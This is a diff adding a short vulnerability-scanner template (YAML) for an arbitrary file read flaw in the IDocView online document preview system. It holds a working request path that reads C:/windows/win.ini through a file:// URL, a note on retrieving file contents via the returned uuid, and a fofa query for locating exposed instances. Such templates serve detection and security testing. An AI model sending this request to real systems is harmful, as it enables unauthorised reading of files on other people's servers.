@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"uuid":'
+          - '"md5":'
+          - bit app support
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/view/qJvqhFt.json?start=1&size=5&url=file:///C:/windows/win.ini&idocv_auth=sapi'
+id: idocview-qjvqhft-fileread
+info:
+  author: zan8in
+  description: |-
+    IDocView在线文档预览系统qJvqhFt任意文件读取
+    1.通过上述poc获取uuid值
+    2.访问url+/view/uuid读取文件内容
+    fofa: title=="在线文档预览 - I Doc View"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: IDocView在线文档预览系统qJvqhFt任意文件读取
+  severity: high
+  tags: idocview,fileread,argus-import
